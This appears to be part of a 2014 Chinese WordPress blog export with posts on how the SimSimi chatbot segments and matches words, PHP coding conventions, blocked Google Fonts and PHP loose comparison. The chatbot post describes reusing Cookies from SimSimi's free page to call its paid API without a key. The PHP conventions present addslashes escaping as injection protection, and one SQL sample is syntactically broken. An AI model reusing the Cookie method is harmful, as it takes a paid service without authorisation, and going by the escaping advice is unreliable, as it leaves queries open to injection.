基于词典的“<strong>双向最大匹配</strong>”法是目前中文信息处理中最简单有效的方法，有这样的统计：汉语文本中90％左右的句子，其与双向最大匹配的结果相吻合，而且是正确的分词结果。</div>
<div align="left">       当正、反向最大匹配算法得出来的切分结果不一样时，就必须对其进行歧义处理，在此不再赘述。
</div>
<strong>2.1.2词库设计</strong>
<div align="left">       由于中文词的特点：1.中文词是一个开放集，词数在增长；2.以不同字开头的词的数目变化很大，多的达到数百个，少的也有可能只有一个或者没有；3.词的长度变化也很大，有单字词，也有由六、七个字成词的。</div>
<div align="left">这就要求在设计词典时，除了考虑访问效率外，还得充分考虑存储利用率。</div>
请看这种数据结构，就能很好地平衡时间与空间。
<a href="http://storage.veitor.net/uploads/2014/06/2.jpg"><img class="aligncenter size-full wp-image-105" alt="2" src="http://storage.veitor.net/uploads/2014/06/2.jpg" width="720" height="302" /></a>
<div align="left">      首字Hash表通过一次哈希运算就可以直接定位汉字在表中的位置。一个单元包括三项内容：C：存储首字；F标志位：存储以C为首字的最长词条的长度；P：指向词表索引表。</div>
<div align="left">        解释一下哈希：散列表 Hash table，也叫哈希表，顾名思义就是把数据都打散了，再按一定规律存起来，加快访问速度。是根据关键码值Key而直接进行访问的数据结构。</div>
<div align="left">       举个栗子：我想将[0,100)做成一个哈希表，选取“模10”作为散列函数，以数组作为存储单元，则得到A[10][10]的数组，A[0]里依次存着0,10,20…90；A[1]里存着1,11,21…91。依次类推。</div>
<div align="left"><strong>现在举一个训练小黄鸡的例子：我教小黄鸡说“大白天的做什么美梦啊？”回答是“哦哈哈哈不用你管”。</strong></div>
<div align="left"><strong>S1：</strong>应用双向最大匹配算法分词：双向分词结果，正向《大白天，的，做什么，美梦，啊》；反向《大白天，的，做什么，美梦，啊》。正向反向都是一样的，所以不需要处理歧义问题。长词优先选择，“大白天”和“做什么”。</div>
<div align="left"><strong>S2：</strong>以“大白天”举例，假设hash函数为f（），并设f（大白天）指向首字hash表项[大，11，P]。于是由该表项指向“3字索引”，再指向对应“词表”。</div>
<div align="left"><strong>S3：</strong>将结构体&lt;大白天，…&gt;插入队尾。体中有一个Ans域，域中某一指针指向“哦哈哈哈不用你管”。</div>
<div align="left"><strong>S4：</strong>完成训练。
</div>
<strong>2.2 匹配</strong>
<div align="left">       可以被描述成如下流程：S1：用户通过聊天界面向系统提出一个话题；S2：系统对该话题进行分词处理；S3：在系统知识库中寻找与该话题匹配的话语回复用户。</div>
<div align="left">       基于词典的分词算法分为<strong>词典加载</strong>、<strong>预处理</strong>、<strong>最大匹配</strong>、<strong>歧义消解</strong>几个阶段。
其具体流程如下：</div>
<div align="left"><strong>S1：预处理阶段</strong>，按照特殊字符(英文字母、数字、标点符号等)将待分析文本进行断句，将待切分的文本切分为只有中文的短句子，这些句子是下一步分词处理的基本单位；</div>
<div align="left">（举个栗子：输入“asdfadf东北师范大学哈哈哈dfadflakfl(*^__^*) 嘻嘻……”，simi只会对其中的中文“东北师范大学哈哈哈嘻嘻”做出响应；输入“(*^__^*)”时，输出“I have no response.”）</div>
<div align="left"><strong>S2：</strong>对断句出来的句子进行<strong>双向最大匹配</strong>（双向匹配，长词优先）分词，分词后的结果作为S3的输入；</div>
<div align="left">（举个栗子：输入“东京古巴比伦”，正向与反向切词结果均为《东京，古巴比伦》，长词优先，所以simi只对“古巴比伦”做出响应；输入“古巴比伦埃菲尔铁塔”，正向与反向切词结果均为《古巴比伦，埃菲尔铁塔》，此时Simi对“埃菲尔铁塔”做出响应）</div>
<div align="left"><strong>S3：</strong>对上一步分词得到的结果进行比较，判断是否存在歧义，如果存在歧义，就进行一定的<strong>歧义消解</strong>；</div>
<div align="left"><strong>S4：</strong>重复S2、S3，直到处理完步骤一中断句所切分出的所有句子单元。</div>
<div align="left">算法流程如图所示：</div>
<div align="left"><a href="http://storage.veitor.net/uploads/2014/06/3.jpg"><img class="aligncenter size-full wp-image-106" alt="3" src="http://storage.veitor.net/uploads/2014/06/3.jpg" width="452" height="540" /></a></div>
<div align="left">
<div align="left">这里给出与小黄鸡对话的例子：我问小黄鸡：“埃菲尔铁塔上45度角仰望星空”。</div>
<div align="left"><strong>S1：</strong>双向最大匹配分词：正向反向均为《埃菲尔铁塔上，45度角，仰望星空》，没有歧义。长词优先，系统选择了“埃菲尔铁塔上”作为关键词；</div>
<div align="left"><strong>S2：</strong>系统在知识库中用刚才说的哈希函数f（埃菲尔铁塔上），找到比如[埃，11，P] 的表项，顺着指针找到6字词的索引，顺着索引找到6字词表，遍历词表，找到&lt;埃菲尔铁塔上，…&gt;结构体；</div>
<div align="left"><strong>S3：</strong>系统随机选择该结构体Ans域中的一个回答（也有可能是根据频率高低来选择）。比如“两年之后等着你”。</div>
<div align="left"><strong>S4：</strong>输出回答，匹配结束。</div>
<strong>Part 3 如何自制小黄鸡</strong>
<div align="left">       根据第二部分所介绍的原理，个人想要真正完成整个小黄鸡的制作是有难度的。如果能做出一个智能较高的聊天机器人，那直接可以去申请专利开公司了~</div>
<div align="left">       所以在这里我们介绍两种比较简单易行的方法，跳过对智能算法的研究，直接调用SimSimi的库。
</div>
<strong>3.1 通过获取Cookies方法</strong>
<div align="left">       首先我们来看人人网小黄鸡是怎么做的。</div>
<div align="left">       原作者团队在github上给出了源代码，网址<a href="https://github.com/wong2/xiaohuangji" target="_blank" rel="noopener noreferrer">https://github.com/wong2/xiaohuangji</a>，他们使用Python语言，获取Cookies，通过人人网的接口，将Simi的库连接到人人上。</div>
<div align="left">       也就是说，人人网小黄鸡并没有真正研究第二部分讲到的 AI聊天机器人的算法，而是<strong>通过调用人家</strong><strong>Simi</strong><strong>的库</strong>！这就是人人网小黄鸡跟Simi的关系。</div>
<div align="left"><em>Cookies：指某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）。利用网页代码中的HTTP头信息进行传递。</em></div>
<div align="left"><em>（举个栗子，我们第一次登录保研论坛时输入用户名与密码，然后选择保存密码，就相当于保存Cookies，下次再打开eeban就不用再登录了~</em></div>
<div align="left">       Cookies作为一个大有用处的存在，同时也极大地危害着网络信息安全。因为是可以通过例如JS脚本等方法窃取Cookies的。想想看，别人获取了你的Cookies，都不用知道你的用户名密码就能以你的身份查看邮件，浏览网页等等……当然这是题外话，有兴趣的我们以后讨论~所以希望大家能经常清理自己的Cookies，不给坏人可乘之机~~）</div>
<div align="left">       回到我们的小黄鸡，下图是人人网小黄鸡源代码中关于获取Cookies的一段：</div>
<div align="left"><a href="http://storage.veitor.net/uploads/2014/06/4.png"><img class="aligncenter size-full wp-image-107" alt="4" src="http://storage.veitor.net/uploads/2014/06/4.png" width="1049" height="651" /></a></div>
<div align="left">
<div align="left">       我们要自制呢，就不用他们那么麻烦~咱们只要几行小代码就可以了~</div>
<div align="left">        简单介绍一下核心算法：</div>
<div align="left"><strong>S1：</strong>利用session对象获取本机在<a href="http://www.simsimi.com/talk.htm" target="_blank" rel="noopener noreferrer">http://www.simsimi.com/talk.htm</a> 上的Cookies</div>
<div align="left">（session，在网络应用中被称为“会话”。简单地说，它就像在网站顶层的一个盒子，无论网页怎么跳转，都能够保存用户的信息。这里注意！Talk页是Simi免费的聊天页面，这一点很重要！）</div>
<div align="left"><strong>S2：</strong>构造头信息，准备将Cookies添加在HTTP头部信息中</div>
<div align="left"><strong>S3：</strong>从SimSimi API接口中获取本机的响应</div>
<div align="left">（刚才说过，Cookies利用HTTP头信息进行传递，所以我们将刚才talk页上的Cookies添加在 API页上，相当于是talk页在调用API！！！这一点很重要。</div>
<div align="left">举个栗子，我们拿着一把锁，去找talk页，talk给了我们一把钥匙，但是我们开锁手法我们不知道，于是我们将锁+钥匙一起送给API，然后它帮我们打开了盒子~~~bling~~bling~~）</div>
<div align="left">来，我们看看原理图：</div>
<div align="left"><a href="http://storage.veitor.net/uploads/2014/06/5.png"><img class="aligncenter size-full wp-image-108" alt="5" src="http://storage.veitor.net/uploads/2014/06/5.png" width="501" height="317" /></a></div>
<div align="left">下面是我用这个方法做的小黄鸡1号：</div>
<div align="left"><a href="http://storage.veitor.net/uploads/2014/06/6.jpg"><img class="aligncenter size-full wp-image-109" alt="6" src="http://storage.veitor.net/uploads/2014/06/6.jpg" width="439" height="641" /></a></div>
<div align="left">
<div align="left">确切的说是这是一只小黄鸡与一只小黄鸭的互掐。哈哈！</div>
<div align="left">       想要做小黄鸡，这是一个省时省力的方法，但是。。。不得不说这是在盗用SimSimi的劳动成果。。。人家指望它的API库卖钱的呢。。。。额额额</div>
<div align="left">       所以接下来我们来看正版的制作方法~~
</div>
<strong>3.2 通过key调用API接口</strong>
<div align="left">      下面这个网址给出了SimSimi的官方API文档：<a href="http://developer.simsimi.com/api" target="_blank" rel="noopener noreferrer">http://developer.simsimi.com/api</a></div>
<div align="left"><a href="http://storage.veitor.net/uploads/2014/06/7.png"><img class="aligncenter size-full wp-image-110" alt="7" src="http://storage.veitor.net/uploads/2014/06/7.png" width="1441" height="755" /></a></div>
<div align="left">
<div align="left">      文档已经写得非常清晰了，<a href="http://api.simsimi.com/request.p?key=your" target="_blank" rel="noopener noreferrer">http://api.simsimi.com/request.p?key=your</a> key&amp;lc=en&amp;ft=1.0&amp;text=hi这一行代码就是在调用官方API接口！也就是说，只要你申请到了key，就能调用simi的API，是不是想想就很爽？~最开始我给大家的小黄鸡2号就是正版鸡有木有~现在来讲解一下怎么做。我选择J2EE平台，MVC模式，JSP+JAVA语言。</div>
<div align="left">       最核心的思想是这样的：我们将从表单中获取的字符串，送去调用官方API接口，用request对象返回结果，再打到屏幕上~~是不是很简单？</div>
<div align="left">下面介绍详细算法流程：</div>
<div align="left"><strong>S1：</strong>talk.jsp——用户填写表单内容，将参数String text传递给chuil.jsp；</div>
<div align="left"><strong>S2：</strong>chuli.jsp——request对象获取传递来的参数，调用API，用Content类中的getContent(urls)方法获取网页的内容，返回结果String ans，将ans传递给talk.jsp；</div>
<div align="left"><strong>S3：</strong>talk.jsp——request对象获取传递来的参数ans，将ans打印到屏幕上。结束。</div>
<div align="left">*其中Content类用于获取网页内容，直接上网找的，都不用自己写~hiahia</div>
<div align="left">这是小黄鸡2号的效果图：</div>
<div align="left"><a href="http://storage.veitor.net/uploads/2014/06/8.png"><img class="aligncenter size-full wp-image-111" alt="8" src="http://storage.veitor.net/uploads/2014/06/8.png" width="1026" height="1018" /></a></div>
<div align="left">
<div align="left">     正版的方法就是简单~但是因为是正版的，就得付出代价，key是要钱的。我现在用的是试用版，key的有效期限是90天，并且每天只有100次响应，也就是说你一天只能调戏它100次。。。是不是很桑感。</div>
<strong>总结</strong>
<div align="left">       经过这么多的介绍，大家是不是对类似小黄鸡（SimSimi）的人工智能聊天机器人有了初步的认识。其实你可以做很多只“小黄鸡”，但它的核心都是Simsimi的库，是人家的东西。所以说偶们新时代的年轻人应该要有自己创新意识~让我们来开发自己的智能算法~做自己的小黄鸡、小黄鸭、小黄狗、小黄瓜吧！~~
</div>
<div align="left">
reference：
<ul>
	<li>[1]李鹏.中文分词在聊天机器人中的应用研究[D].中南大学.2009(05)</li>
	<li>[2] 易顺明,胡振宇. 中文聊天机器人原型系统的设计[J]. 沙洲职业工学院学报. 2007(02)</li>
	<li>[3]查询处理及分词技术.百度</li>
	<li>[4]设计和构造一个自动应答聊天机器人都涉及到哪些技术.知乎</li>
</ul>
</div>
<div align="left"></div>
<strong>问答环节
</strong>
<div align="left"><strong>训练的话玩家调戏它的数据会被录入作为以后回答别人的参考么？还是需要相应权限才能存入库里？</strong></div>
<div align="left">这个就是教学界面。会的。玩家教给它的话题，会在切词之后，打包它的回答，一起存入词库。别人触发相似的关键词，也有可能回答刚刚你教过的答案。</div>
<div align="left"><strong>那一个问题有不同答案，如何选择呢？</strong></div>
<div align="left">一个关键词下链接了好几种不同的回答，系统会随机选择一个，比如输入“哈哈”，回答有可能是“呵呵”“笑什么笑”……</div>
<div align="left"><strong>以前的这个词表里面对于每个可能出现的词已经有了确定的答案的意思吗？</strong></div>
<div align="left">对，构建词库的时候，还有训练的时候都已经写进去了</div>
<div align="left"><strong>但是训练的时候不能随便的吧？万一教他的是错误的知识呢？</strong></div>
<div align="left">谁都可以~~但是一般会有过滤系统，要审核的，像simi就有做任务这个玩法，任务就是，给你别人的回答，让你判断是否可以给不满16岁的孩子看，也有存进去的时候设置敏感词什么的。</div>
<div align="left"></div>
<div align="left">原文地址：http://www.cnblogs.com/huj690/archive/2013/01/24/2875114.html</div>
</div>
</div>
</div>
</div>
</div>
</div>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>103</wp:post_id>
		<wp:post_date><![CDATA[2014-06-03 13:41:58]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-06-03 13:41:58]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e6%99%ba%e8%83%bd%e8%81%8a%e5%a4%a9%e6%9c%ba%e5%99%a8%e4%ba%ba%e5%b0%8f%e9%bb%84%e9%b8%a1%e5%8f%8a%e5%85%b6%e5%88%b6%e4%bd%9c%e6%96%b9%e6%b3%95]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="%e4%ba%ba%e5%b7%a5%e6%99%ba%e8%83%bd"><![CDATA[人工智能]]></category>
		<category domain="category" nicename="sjms"><![CDATA[设计模式]]></category>
						</item>
					<item>
		<title>团队开发中的代码编写规范</title>
		<link>http://wp.veitor.net/2014/06/03/%e5%9b%a2%e9%98%9f%e5%bc%80%e5%8f%91%e4%b8%ad%e7%9a%84%e4%bb%a3%e7%a0%81%e7%bc%96%e5%86%99%e8%a7%84%e8%8c%83/</link>
		<pubDate>Tue, 03 Jun 2014 14:20:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=113</guid>
		<description></description>
		<content:encoded><![CDATA[代码规范问题虽然不影响程序的运行，但是却很可以使代码在管理上变得很容易。
<h4>注释</h4>
注释是对于那些容易忘记作用的代码添加简短的介绍性内容。请使用 C 样式的注释“/* */”和标准 C++ 注释“//”。类、方法、函数请使用 phpdoc 格式的注释，在函数及方法的注释中至少要有 @param 和 @return 标签，如：
<pre class="lang:php decode:true "> /**
* 这里是函数说明
*
* @param int $a 参数1
* @param int $b 参数2
* @return xxx 参数1与参数2乘积
*/
public function function_demo_1($a, $b)
{
	return intval($a) * intval($b);
}</pre>
对于 bug 修正时务必写上 bug 修改人、修改时间和修正 bug 的原因。
<pre class="lang:php decode:true ">// add xxx by liuming@leju.sina.com.cn on 2009-09-01, test
// remove xxx by guoning@leju.sina.com.cn on 2009-09-02, test
// last modified by liuxin@leju.sina.com.cn on 2009-09-05, typo
// last modified by dengwei@leju.sina.com.cn on 2009-09-09, typo
// fixed memory leak
unset($something);</pre>
程序开发中难免留下一些临时代码和调试代码，此类代码必须添加注释，以免日后遗忘。所有临时性、调试性、试验性的代码，必须添加统一的注释标记“//@debug:”并后跟完整的注释信息，这样可以方便在程序发布和最终调试前批量检查程序中是否还存在有疑问的代码。例如：
<pre class="lang:php decode:true ">$num = 1;
$flag = true; // @debug: 测试文件加载
if (!$flag)
{
	// debug statements
}</pre>
&nbsp;
<h4>书写规则</h4>
缩进与换行：每个缩进的单位约定是一个TAB(4个空白字符宽度)，需每个参与项目的开发人员在编辑器中进行强制设定，以防在编写代码时遗忘而造成格式上的不规范。并且所有换行采用 UNIX 格式，既只有 \n 换行。
本缩进规范适用于 HTML、PHP、JS、AS 中的函数、类、逻辑结构、循环等。
大括号 {}、if 和 switch：首括号与关键词同行，尾括号与关键字同列；
if 结构中，if 和 elseif 与前后两个圆括号同行，左右各一个空格，所有大括号都单独另起一行。另外，即便if后只有一行语句，仍然需要加入大括号，以保证结构清晰；
switch 结构中，通常当一个 case 块处理后，将跳过之后的 case 块处理，因此大多数情况下需要添加 break。break 的位置视程序逻辑，与 case 同在一行，或新起一行均可，但同一 switch 体中，break 的位置格式应当保持一致。
以下是符合上述规范的例子：
<pre class="lang:php decode:true ">if ($condition)
{
	switch ($var)
	{
    	case 1:
       		echo 'var is 1';
      		break;
      	case 2:
          	echo 'var is 2';
          	break;
        	default:
    	echo 'var is neither 1 or 2';
        	break;
	}
}
else
{
	switch ($str)
 	{
   		case 'abc':
     		$result = 'abc';
    		break;
     	default:
           	$result = ‘unknown’;
        	break;
	}
}</pre>
例外的，数据库 SQL 语句中，除字符串外所有数据都不得加单引号，但是在进行 SQL 查询之前都必须经过 intval 等相关函数处理；所有字符串都必须加单引号，以避免可能的注入漏洞和SQL错误。正确的写法为：
<pre class="lang:php decode:true ">$catid = intval($catid); // 当 $catid 只能为 int 时
$username = addslashes($username);
$username = "SELECT * FROM phpcms_member WHERE username = '{$username}' AND catid = {$catid}";</pre>
&nbsp;
所有数据在插入数据库之前，均需要进行addslashes()处理，以免特殊字符未经转义在插入数据库的时候出现错误。如果使用基础类 baselib_request_arg 通过 GET、POST、FILE 取得的变量默认情况下已经使用了 addslashes() 进行了转义，不必重复进行。如果数据处理必要(例如用于直接显示)，可以使用 stripslashes() 恢复，但数据在插入数据库之前必须再次进行转义。
缓存文件中，一般对缓存数据的值采用 addcslashes($string, '\'\\') 进行转义。
<h4>命名原则</h4>
命名是程序规划的核心，只要你给事物想到正确的名字，就会给你以及后来的人带来比代码更强的力量。总的来说，只有了解系统的程序员才能为系统取出最合适的名字。如果所有的命名都与其自然相适合，则关系清晰，含义可以推导得出，一般人的推想也能在意料之中。
就一般约定而言，类、函数和变量的名字应该总是能够描述让代码阅读者能够容易的知道这些代码的作用。形式越简单、越有规则，就越容易让人感知和理解。应该避免使用模棱两可，晦涩不标准的命名。
<strong>变量、对象、函数名</strong>
变量、对象、函数名一律为小写格式，单词之间一般使用下划线 “_” 进行分割；
以标准计算机英文为蓝本，杜绝一切拼音、或拼音英文混杂的命名方式；
变量命名只能使用项目中有据可查的英文缩写方式，例如可以使用$data而不可使用$data1、$data2这样容易产生混淆的形式，应当使用 $article_data、$user_data 这样一目了然容易理解的形式；
可以合理的对过长的命名进行缩写，例如 $bio($biography)，$tpp($threadsPerPage)，$uid($userid) 前提是英文中有这样既有的缩写形式，或字母符合英文缩写规范；
必须清楚所使用英文单词的词性，在权限相关的范围内，大多使用$enable***、$is*** 的形式，前者后面接动词，后者后面接形容词。
<strong>常量</strong>
常量应该总是全部使用大写字母命名，少数特别必要的情况下，可使用划线来分隔单词；
PHP 的内建值 TRUE、FALSE 和 NULL 必须全部采用大写字母书写。
<h4>变量的初始化与逻辑检查</h4>
任何变量在进行累加、直接显示或存储前必需进行初使化，例如：
&nbsp;
<pre class="lang:php decode:true ">$number = 0; //数值型初始化
$string = ''; //字符串初始化
$array = array(); //数组初始化</pre>
&nbsp;
判断一个无法确定（不知道是否已被赋值）的变量时，可用 empty() 或 isset()，而不要直接使用 if($switch) 的形式，除非你确切的知道此变量一定已经被初始化并赋值。
判断一个变量是否为数组，请使用is_array()，这种判断尤其适用于对数组进行遍历的操作，例如foreach()，因为如果不事先判断，foreach()会对非数组类型的变量报错；
判断一个数组元素是否存在，可使用isset($array[‘key’])，也可使用empty()，两者异同见上。
<h4>兼容性</h4>
代码设计应当兼顾 PHP 高低版本的特性。当前应仍然以 PHP 5.2 作为最低通过平台(部分历史遗留项目例外)，尽量不使用高版本 PHP 5.3 新增的函数、常数或者常量。如果使用只在高版本才具备的函数，必须对其进行二次封装，自动判断当前 PHP 版本，并自行编写低版本下的兼容代码；
对于个别函数，参数要求或者代码要求应当以较为严格的PHP版本为准；
除非必要，不要使用 PHP 扩展模块中的函数。使用时应当加入必要的判断，当服务器环境不支持此函数的时候，进行必要的处理。文档和程序中的功能说明中，也应加上兼容性说明。
<h4>包含调用</h4>
包含调用程序文件时，请全部使用 require_once，以避免可能的重复包含问题；
包含调用缓存文件，由于缓存文件无法保证 100% 正确打开，请使用 include_once。在必要时，可以使用 @include_once 的方式，以忽略错误提示；我们仍建议大家把缓存数据放到 LC (Local cache:xcache、eaccelerator、APC) 或 RC (remote cache:memcached、couchdb ...)。
包含和调用代码中，须以 APP_ROOT . '/'开头，应避免直接写程序文件名 (例如：require_once 'x.php') 的做法；
所有被包含和调用的程序文件，包括但不限于程序、缓存或模板，通常其不能被直接URL请求。通过在 ./config.php 中定义一个标记性常量 APPNAME ，来判断程序是否被合法调用。因此，在除了./config.php 以外的任何一个被包含和调用的程序文件中，需要包含以下内容，以使得访问者无法直接通过URL 请求该文件：
defined('APPNAME') or exit('Access Denied');
<strong>错误报告级别</strong>
在开发和调试阶段，请使用 error_reporting(E_ALL) 作为默认的错误报告级别，此级别最为严格，能够报告程序中所有的错误、警告和提示信息，以帮助大家检查和核对代码，避免大多数安全性问题和逻辑错误、拼写错误。error_reporting() 可以公共头文件进行设置，或某个指定的文件进行设置，但是请不要在各个文件中都加一个 error_reporting 。
代码部署时，请删除所有 error_reporting 和 ini_set('display_errors', xxx) 设置，php 采用服务器默认配置，此配置由服务器维护人员统一配置。
<h4>数据库设计</h4>
<strong>字段</strong>
表和字段命名：表和字段的命名以前面《命名原则》的约定为基本准则。所有数据表名称，只要其名称是可数名词，则必须以复数方式命名，例如：members(用户表)；存储多项内容的字段，或代表数量的字段，也应当以复数方式命名，例如：hits(查看次数)、items(内容数量)。
当几个表间的字段有关连时，要注意表与表之间关联字段命名的统一，如 article_hash_01 表中的 articleid 与 article_data_hash_01 表中的 articleid。
代表id自增量的字段，通常用以下几种形式：
<ul>
	<li>一般情况下，使用全称的形式，例如 userid、articleid；</li>
	<li>没有功能性作用，只为管理和维护方便而设的id，可以使用全称的形式，也可只将其命名为id。</li>
</ul>
<strong>字段结构</strong>
允许 NULL 值的字段，数据库在进行比较操作时，会先判断其是否为 NULL，非 NULL 时才进行值的必对。因此基于效率的考虑，建议所有字段均不能为空，即全部 NOT NULL；
预计不会存储非负数的字段，例如各项 id、发帖数等，必须设置为 UNSIGNED 类型。
UNSIGNED 类型比非 UNSIGNED 类型所能存储的正整数范围大一倍，因此能获得更大的数值存储空间；
存储开关、选项数据的字段，通常使用 tinyint(1) 非 UNSIGNED 类型，少数情况也可能使用enum() 结果集的方式。tinyint 作为开关字段时，通常 1 为打开；0 为关闭；-1 为特殊数据，例如 N/A(不可用)；高于 1 的为特殊结果或开关二进制数组合；
MEMORY/HEAP 类型的表中，要尤其注意规划节约使用存储空间，这将节约更多内存。例如cdb_sessions 表中，就将 IP 地址的存储拆分为4个 tinyint(3) UNSIGNED 类型的字段，而没有采用 char(15) 的方式；
任何类型的数据表，字段空间应当本着足够用，不浪费的原则。
<h4>SQL语句</h4>
所有 SQL 语句中，除了表名、字段名称以外，全部语句和函数均需大写，应当杜绝小写方式或大小写混杂的写法。例如 select * from members; 是不符合规范的写法。
很长的 SQL 语句应当有适当的断行，依据 JOIN、FROM、ORDER BY等关键字进行界定。
通常情况下，在对多表进行操作时，要根据不同表名称，对每个表指定一个 1 ~ 2 个字母的缩写，以利于语句简洁和可读性。
如下的语句范例，是符合规范的：
<pre class="lang:php decode:true ">$result = $db-&gt;query("SELECT m.*, i.*
FROM " . TABLE_MEMBER . " AS m, " . TABLE_MEMBERINFO . " AS i
WHERE m.userid = i.userid AND m.userid = '$_userid');</pre>
&nbsp;
原文地址：http://www.nowamagic.net/librarys/veda/detail/513]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>113</wp:post_id>
		<wp:post_date><![CDATA[2014-06-03 14:20:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-06-03 14:20:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%9b%a2%e9%98%9f%e5%bc%80%e5%8f%91%e4%b8%ad%e7%9a%84%e4%bb%a3%e7%a0%81%e7%bc%96%e5%86%99%e8%a7%84%e8%8c%83]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="chengxuyushenghuo"><![CDATA[程序与生活]]></category>
		<category domain="post_tag" nicename="%e8%a7%84%e8%8c%83"><![CDATA[规范]]></category>
						</item>
					<item>
		<title>谷歌服务被“封” 网站加载变慢</title>
		<link>http://wp.veitor.net/2014/06/24/%e8%b0%b7%e6%ad%8c%e6%9c%8d%e5%8a%a1%e8%a2%ab%e5%b0%81-%e7%bd%91%e7%ab%99%e5%8a%a0%e8%bd%bd%e5%8f%98%e6%85%a2/</link>
		<pubDate>Tue, 24 Jun 2014 09:00:32 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=117</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="http://storage.veitor.net/uploads/2014/06/1402017825583.jpg"><img class="aligncenter size-full wp-image-118" alt="1402017825583" src="http://storage.veitor.net/uploads/2014/06/1402017825583.jpg" width="516" height="271" /></a>
从5月27号左右开始，谷歌(Google)在华的几乎所有的服务都处于无法使用的状态，谷歌官网域名Google.com、谷歌香港 Google.com.hk所有服务都打不开。ping出来的IP均显示为“美国”，也就是说谷歌香港的服务器，已经由香港转移至美国，所以链接实际会很 长，甚至断断续续出现请求超时的情况。
当时我的博客所在的SAE也有点小故障，所以那几天我的博客一直访问很慢，我以为是SAE的问题，结果后来终于发现博客的几个页面加载了google的字体资源，所以导致网站加载特别缓慢，现在终于解决了。
360网站卫士的解决方案：
修改方法如下：
打开wordpress代码中的文件wp-includes/script-loader.php文件，搜索：fonts.googleapis.com找到这行代码：
$open_sans_font_url = “//fonts.googleapis.com/css?family1=Open+Sans:300italic,400italic,600italic,300,400,600&amp;subset=$subsets”;
把fonts.googleapis.com替换为fonts.useso.com
修改完保存，再次刷新，大家就可以发现，自己的网站速度已经比以前快了很多，几乎瞬间就可以拿到Google字体了。原因就是本来需要从美国服务器才能拿到的google字体，现在已经遍布360全国的机房了。
醒妹网的解决方案：
既然是关于Google字体，那解除字体问题就可以了。如果网页中设定的字体无法加载，那么网页会按照浏览器默认的字体显示。但浏览器并不知道Google字体服务被屏蔽了，还那么二的一直加载，直到加载失败。但这个过程会耗费十几秒的时间。
<strong>　　WordPress网站解决Google字体的办法：</strong>
第一种方法：安装Disable Google Font插件，但经过测试之后，没有明显效果。
第二种方法：注释或删除掉style.css和function.php有关加载Google字体的代码fonts.googleapis.com即可。
当然以上两种方法可以同时使用。
如果在更改style.css或function.php文件之后，wordpress网站报错，无法打开，或者新建文章时上传图片失败。一定是将wordpress文件的编码保存为非ANSI编码，用记事本打开，保存时选择编码ANSI替换掉原来的文件即可。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>117</wp:post_id>
		<wp:post_date><![CDATA[2014-06-24 09:00:32]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-06-24 09:00:32]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e8%b0%b7%e6%ad%8c%e6%9c%8d%e5%8a%a1%e8%a2%ab%e5%b0%81-%e7%bd%91%e7%ab%99%e5%8a%a0%e8%bd%bd%e5%8f%98%e6%85%a2]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="google"><![CDATA[google]]></category>
		<category domain="category" nicename="chengxuyushenghuo"><![CDATA[程序与生活]]></category>
						</item>
					<item>
		<title>PHP中慎用双等于(==)</title>
		<link>http://wp.veitor.net/2014/06/24/php%e4%b8%ad%e6%85%8e%e7%94%a8%e5%8f%8c%e7%ad%89%e4%ba%8e/</link>
		<pubDate>Tue, 24 Jun 2014 09:09:37 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=120</guid>
		<description></description>
		<content:encoded><![CDATA[PHP比较运算符出现的频率实在是太高了，尤其是 ==
if(a == b){
// do something
}
但是，你真的掌握了 == 了吗？细节很重要！
来看下面的代码，说出你认为正确的答案
var_dump('  123fg456'==123);
var_dump('some string' == 0);
var_dump(123.0 == '123d456');
var_dump(0 == "a");
var_dump("1" == "01");
var_dump("1" == "1e0");
先想出你的答案，然后再运行一次看看。如果答案没有差错，那么恭喜你，基础知识很扎实。
<strong><span>解释：
</span></strong>如果比较一个整数和字符串，则字符串会被转换为整数。如果比较两个数字字符串，则作为整数比较。此规则也适用于 switch 语句。
特别注意，字符串转换为整数时，是从左到右，直到遇到非数字字符为止。也就是说 '123abc456' 会被转换成 123，而不是 123456。另外字符串开始的空格会被忽略，比如 '   234abc' 转换为 234。
<strong>下面附上松散比较和严格比较的对照表</strong>
<a href="http://storage.veitor.net/uploads/2014/06/201306061156212.png"><img class="aligncenter size-full wp-image-121" alt="201306061156212" src="http://storage.veitor.net/uploads/2014/06/201306061156212.png" width="688" height="800" /></a>]]></content:encoded>
